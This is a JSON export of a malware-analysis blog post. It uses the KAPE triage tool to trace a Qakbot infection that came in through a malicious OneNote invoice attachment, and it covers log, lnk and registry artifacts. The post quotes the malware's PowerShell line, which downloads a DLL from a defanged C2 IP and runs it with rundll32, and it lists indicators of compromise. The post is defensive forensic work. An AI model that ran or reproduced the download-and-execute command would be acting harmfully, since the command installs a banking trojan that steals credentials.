{"id":1097,"date":"2023-03-12T16:34:38","date_gmt":"2023-03-12T16:34:38","guid":{"rendered":"https:\/\/malwr0nwind0z.com\/?p=1097"},"modified":"2024-01-29T17:17:14","modified_gmt":"2024-01-29T17:17:14","slug":"post_3-12-23_kape_forensics_qakbot_qaknote","status":"publish","type":"post","link":"https:\/\/malwr0nwind0z.com\/post_3-12-23_kape_forensics_qakbot_qaknote\/","title":{"rendered":"KAPE Collection: Forensic artifacts from a Qakbot infection (via Qaknote)"},"content":{"rendered":"\n<figure class=\"wp-block-embed is-type-video is-provider-youtube wp-block-embed-youtube wp-embed-aspect-16-9 wp-has-aspect-ratio\"><div class=\"wp-block-embed__wrapper\">\n<div class=\"ast-oembed-container \" style=\"height: 100%;\"><iframe title=\"Using KAPE to analyze a Qakbot infection\" width=\"500\" height=\"281\" src=\"https:\/\/www.youtube.com\/embed\/JzVcgZ-tzy0?feature=oembed\" frameborder=\"0\" allow=\"accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share\" allowfullscreen><\/iframe><\/div>\n<\/div><figcaption class=\"wp-element-caption\"><strong>Video 1: Watch the companion video that this blog post inspired.<\/strong><\/figcaption><\/figure>\n\n\n<p><style>\/*! elementor - v3.19.0 - 29-01-2024 *\/<br \/>\n.elementor-column .elementor-spacer-inner{height:var(--spacer-size)}.e-con{--container-widget-width:100%}.e-con-inner>.elementor-widget-spacer,.e-con>.elementor-widget-spacer{width:var(--container-widget-width,var(--spacer-size));--align-self:var(--container-widget-align-self,initial);--flex-shrink:0}.e-con-inner>.elementor-widget-spacer>.elementor-widget-container,.e-con>.elementor-widget-spacer>.elementor-widget-container{height:100%;width:100%}.e-con-inner>.elementor-widget-spacer>.elementor-widget-container>.elementor-spacer,.e-con>.elementor-widget-spacer>.elementor-widget-container>.elementor-spacer{height:100%}.e-con-inner>.elementor-widget-spacer>.elementor-widget-container>.elementor-spacer>.elementor-spacer-inner,.e-con>.elementor-widget-spacer>.elementor-widget-container>.elementor-spacer>.elementor-spacer-inner{height:var(--container-widget-height,var(--spacer-size))}.e-con-inner>.elementor-widget-spacer.elementor-widget-empty,.e-con>.elementor-widget-spacer.elementor-widget-empty{position:relative;min-height:22px;min-width:22px}.e-con-inner>.elementor-widget-spacer.elementor-widget-empty .elementor-widget-empty-icon,.e-con>.elementor-widget-spacer.elementor-widget-empty .elementor-widget-empty-icon{position:absolute;top:0;bottom:0;left:0;right:0;margin:auto;padding:0;width:22px;height:22px}<\/style><\/p>\n<p><img decoding=\"async\" src=\"https:\/\/malwr0nwind0z.com\/wp-content\/uploads\/2023\/03\/icon-description-automatically-generated.png\" alt=\"Icon Description automatically generated\" \/><\/p>\n<p><strong>KAPE: Kroll Artifact Parser and Extractor<\/strong><\/p>\n<p>KAPE is a open source Windows-based triage program that will find and collect important forensically relevant Windows OS artifacts (System logs, Registry entries, etc.). KAPE can be ran on a live Windows operating or a mounted Windows image (i.e. dead-box forensics). KAPE utilizes Targets and Modules to collect and triage forensic artifacts.<\/p>\n<p><strong>How KAPE Works<\/strong><\/p>\n<p>KAPE utilizes Targets and Modules to collect and triage forensic artifacts. The concepts of Targets and Modules allow this tool to do its work:<\/p>\n<p>Targets: the type of artifacts (files, logs, or registry hives) that you can collect and store in a container (i.e. vhdx, zip).<\/p>\n<p>Modules: scripts that utilize third-party programs\/parsers to process and export (i.e. .csv, zip) the artifacts.<\/p>\n<p>Below, we run KAPE to collect forensic artifacts on a Windows 10 machine suspected of being infected with Qakbot. The KAPE collection is being saved to an external HDD (D:).<\/p>\n<p><img decoding=\"async\" src=\"https:\/\/malwr0nwind0z.com\/wp-content\/uploads\/2023\/03\/word-image-1097-2.png\" \/> <br \/><strong>Figure 1: KAPE ran from an external drive.<\/strong><\/p>\n<p><img decoding=\"async\" src=\"https:\/\/malwr0nwind0z.com\/wp-content\/uploads\/2023\/03\/text-description-automatically-generated.png\" alt=\"Text Description automatically generated\" \/><br \/><strong>Figure 2: KAPE collection is done.<\/strong><\/p>\n<p>The target forensic artifacts (files, logs, or registry hives) that I collect are stored in a vhdx container where I can later mount and analyze.<\/p>\n<p><img decoding=\"async\" src=\"https:\/\/malwr0nwind0z.com\/wp-content\/uploads\/2023\/03\/word-image-1097-4.jpeg\" \/><\/p>\n<p><strong>Figure 3: Target forensic artifacts stored in a xhdx file.<\/strong><\/p>\n<p><img decoding=\"async\" src=\"https:\/\/malwr0nwind0z.com\/wp-content\/uploads\/2023\/03\/graphical-user-interface-text-application-email.jpeg\" alt=\"Graphical user interface, text, application, email Description automatically generated\" \/><strong>Figure 4: The xhdx file is mounted for analysis.<\/strong><\/p>\n<p><img decoding=\"async\" src=\"https:\/\/malwr0nwind0z.com\/wp-content\/uploads\/2023\/03\/graphical-user-interface-application-table-exce.jpeg\" alt=\"Graphical user interface, application, table, Excel Description automatically generated\" \/><strong>Figure 5: The CopyLog of all of the files that were collected in the xhdx file.<\/strong><\/p>\n<p><strong>Qakbot: A Banking Trojan<\/strong><\/p>\n<p>Qakbot is a malicious Banking Trojan that has been actively used in cyberattacks since 2009. This malware is designed to compromise the security of a target system and allow remote attackers to gain unauthorized access and control. Once it infects a computer, it then steals sensitive information such as banking credentials, personal information, and email passwords.<\/p>\n<p><strong>How This Qakbot Infection Started<\/strong><\/p>\n<p>Qakbot is typically delivered to the victim through various methods, including phishing emails, malspam, exploit kits, and exploiting vulnerabilities in software. The exact method of delivery may vary depending on the attackers&#8217; goals.<\/p>\n<p>In this instance, our digital forensic artifacts confirm that it was delivered through malspam; that contained a malicious Microsoft OneNote document (Qaknote) within a zip archive named Invoice #030223.zip. The malicious OneNote document (Invoice #030223.one) contained a social engineering Microsoft O365 themed image (double click \u201copen\u201d), that once clicked, it executes an embedded WScript file (O P E N .wsf).<\/p>\n<p><img decoding=\"async\" src=\"https:\/\/malwr0nwind0z.com\/wp-content\/uploads\/2023\/03\/graphical-user-interface-application-description.png\" alt=\"Graphical user interface, application Description automatically generated\" \/> <br \/><strong>Figure 6: Embedded social engineering Microsoft O365 themed image (double click \u201copen\u201d)in the OneNote document (Invoice #030223.one).<\/strong><\/p>\n<p><strong>Qakbot &#8211; Forensic Artifacts<\/strong><\/p>\n<p>The review of the user\u2019s Recent folder shows a lnk file for O P E N .wsf, indicating that it was double clicked and executed. Microsoft Protection (MPLog) was able to log the execution of this WScript file (O P E N .wsf) as having PID:7636 and the process start time: 133225496244686642 (LDAP\/FILETIME) which converts to Sunday, March 5, 2023 11:13:44 PM GMT-05:00.<\/p>\n<p><img decoding=\"async\" src=\"https:\/\/malwr0nwind0z.com\/wp-content\/uploads\/2023\/03\/word-image-1097-8.jpeg\" \/><strong>Figure 7: Lnk file (located in Recent folder) pointing to the WScript file (O P E N .wsf) that the user executed.<\/strong><\/p>\n<p><strong><img decoding=\"async\" src=\"https:\/\/malwr0nwind0z.com\/wp-content\/uploads\/2023\/03\/Windows_Defender_log_pid_start_wsf.jpg\" alt=\"\" width=\"440\" height=\"18\" \/>\u00a0<\/strong><\/p>\n<p><strong>Figure 8: Microsoft Protection logging the PID and execution time of the WScript file (O P E N .wsf).<\/strong><\/p>\n<p>The WScript file invokes PowerShell to download a malicious Qakbot .dll from the following URL:<\/p>\n<p>Download URL: http:\/\/143.198.63[.]241\/MCv\/020 -O $env:TEMP; rundll32 $env:TEMP\\dysphemistic.dll,RS32;<\/p>\n<p>Drop folder location: C:Users&lt;Username&gt;AppDataLocalTempdysphemistic.dll (Classification: Qakbot .dll)<\/p>\n<p>This PowerShell activity was decoded and logged in the Microsoft-Windows-PowerShell%4Operational Event logs (Note: this logging is disabled by default).<\/p>\n<p><img decoding=\"async\" src=\"https:\/\/malwr0nwind0z.com\/wp-content\/uploads\/2023\/03\/table-description-automatically-generated.jpeg\" alt=\"Table Description automatically generated\" \/><strong>Figure 9: PowerShell Event log showing the download of dysphemistic.dll.<\/strong><\/p>\n<p>Microsoft Protection (MPLog) Telemetry was able to log the execution of dysphemistic.dll.<\/p>\n<p><img decoding=\"async\" src=\"https:\/\/malwr0nwind0z.com\/wp-content\/uploads\/2023\/03\/graphical-user-interface-text-application-descr.jpeg\" alt=\"Graphical user interface, text, application Description automatically generated\" \/><strong>Figure 10: Microsoft Protection logging the execution of dysphemistic.dll.<\/strong><\/p>\n<p>Last but not least, we had to perform some Registry Forensics, due to having encoded PowerShell stores in HKCUSOFTWARE subkeys \u2018Meteors\u2019 &amp; \u2018disprofitablePlanographically\u2019.<\/p>\n<p><img decoding=\"async\" src=\"https:\/\/malwr0nwind0z.com\/wp-content\/uploads\/2023\/03\/graphical-user-interface-application-description-1.png\" alt=\"Graphical user interface, application Description automatically generated\" \/><strong>Figure 11: Encoded PowerShell stored in HKCUSOFTWAREMeteors.<\/strong><\/p>\n<p><img decoding=\"async\" src=\"https:\/\/malwr0nwind0z.com\/wp-content\/uploads\/2023\/03\/graphical-user-interface-application-description-2.png\" alt=\"Graphical user interface, application Description automatically generated\" \/><strong>Figure 12: Encoded PowerShell stored in HKCUSOFTWARE<a id=\"post-1097-_Hlk129460078\"><\/a>disprofitablePlanographically.<\/strong><\/p>\n<p>That ends this blog, where we used KAPE to collect and analyzed forensic artifacts from stage 1 of this Qakbot infection.<\/p>\n<p><strong>IOCs:<\/strong><\/p>\n<p>Invoice #030223.zip (MD5: abc43976c90a3bfef20f08f3632e7c22)<\/p>\n<p>Invoice #030223.one (MD5: 5E0085D44B2CD845CC8A964DAB23027A)<\/p>\n<p>O P E N .wsf (MD5: 56E1C721F50A8AAE1FBAF1459A1208E2)<\/p>\n<p>dysphemistic.dll (MD5: 0AB80C49FDEA4229C022F43F5357E64B)<\/p>\n<p><strong>C2 IOC:<\/strong><\/p>\n<p>http:\/\/143.198.63[.]241\/MCv\/020<\/p>","protected":false},"excerpt":{"rendered":"<p>KAPE: Kroll Artifact Parser and Extractor KAPE is a open source Windows-based triage program that will find and collect important forensically relevant Windows OS artifacts (System logs, Registry entries, etc.). KAPE can be ran on a live Windows operating or a mounted Windows image (i.e. dead-box forensics). KAPE utilizes Targets and Modules to collect and [&hellip;]<\/p>\n","protected":false},"author":1,"featured_media":0,"comment_status":"open","ping_status":"open","sticky":false,"template":"","format":"standard","meta":{"om_disable_all_campaigns":false,"_monsterinsights_skip_tracking":false,"_monsterinsights_sitenote_active":false,"_monsterinsights_sitenote_note":"","_monsterinsights_sitenote_category":0,"site-sidebar-layout":"default","site-content-layout":"","ast-site-content-layout":"default","site-content-style":"default","site-sidebar-style":"default","ast-global-header-display":"","ast-banner-title-visibility":"","ast-main-header-display":"","ast-hfb-above-header-display":"","ast-hfb-below-header-display":"","ast-hfb-mobile-header-display":"","site-post-title":"","ast-breadcrumbs-content":"","ast-featured-img":"","footer-sml-layout":"","theme-transparent-header-meta":"","adv-header-id-meta":"","stick-header-meta":"","header-above-stick-meta":"","header-main-stick-meta":"","header-below-stick-meta":"","astra-migrate-meta-layouts":"set","ast-page-background-enabled":"default","ast-page-background-meta":{"desktop":{"background-color":"","background-image":"","background-repeat":"repeat","background-position":"center center","background-size":"auto","background-attachment":"scroll","background-type":"","background-media":"","overlay-type":"","overlay-color":"","overlay-gradient":""},"tablet":{"background-color":"","background-image":"","background-repeat":"repeat","background-position":"center center","background-size":"auto","background-attachment":"scroll","background-type":"","background-media":"","overlay-type":"","overlay-color":"","overlay-gradient":""},"mobile":{"background-color":"","background-image":"","background-repeat":"repeat","background-position":"center center","background-size":"auto","background-attachment":"scroll","background-type":"","background-media":"","overlay-type":"","overlay-color":"","overlay-gradient":""}},"ast-content-background-meta":{"desktop":{"background-color":"var(--ast-global-color-5)","background-image":"","background-repeat":"repeat","background-position":"center center","background-size":"auto","background-attachment":"scroll","background-type":"","background-media":"","overlay-type":"","overlay-color":"","overlay-gradient":""},"tablet":{"background-color":"var(--ast-global-color-5)","background-image":"","background-repeat":"repeat","background-position":"center center","background-size":"auto","background-attachment":"scroll","background-type":"","background-media":"","overlay-type":"","overlay-color":"","overlay-gradient":""},"mobile":{"background-color":"var(--ast-global-color-5)","background-image":"","background-repeat":"repeat","background-position":"center center","background-size":"auto","background-attachment":"scroll","background-type":"","background-media":"","overlay-type":"","overlay-color":"","overlay-gradient":""}},"footnotes":""},"categories":[16],"tags":[19,22,23,21,88,14,85,18,17,20],"aioseo_notices":[],"_links":{"self":[{"href":"https:\/\/malwr0nwind0z.com\/wp-json\/wp\/v2\/posts\/1097"}],"collection":[{"href":"https:\/\/malwr0nwind0z.com\/wp-json\/wp\/v2\/posts"}],"about":[{"href":"https:\/\/malwr0nwind0z.com\/wp-json\/wp\/v2\/types\/post"}],"author":[{"embeddable":true,"href":"https:\/\/malwr0nwind0z.com\/wp-json\/wp\/v2\/users\/1"}],"replies":[{"embeddable":true,"href":"https:\/\/malwr0nwind0z.com\/wp-json\/wp\/v2\/comments?post=1097"}],"version-history":[{"count":27,"href":"https:\/\/malwr0nwind0z.com\/wp-json\/wp\/v2\/posts\/1097\/revisions"}],"predecessor-version":[{"id":1463,"href":"https:\/\/malwr0nwind0z.com\/wp-json\/wp\/v2\/posts\/1097\/revisions\/1463"}],"wp:attachment":[{"href":"https:\/\/malwr0nwind0z.com\/wp-json\/wp\/v2\/media?parent=1097"}],"wp:term":[{"taxonomy":"category","embeddable":true,"href":"https:\/\/malwr0nwind0z.com\/wp-json\/wp\/v2\/categories?post=1097"},{"taxonomy":"post_tag","embeddable":true,"href":"https:\/\/malwr0nwind0z.com\/wp-json\/wp\/v2\/tags?post=1097"}],"curies":[{"name":"wp","href":"https:\/\/api.w.org\/{rel}","templated":true}]}}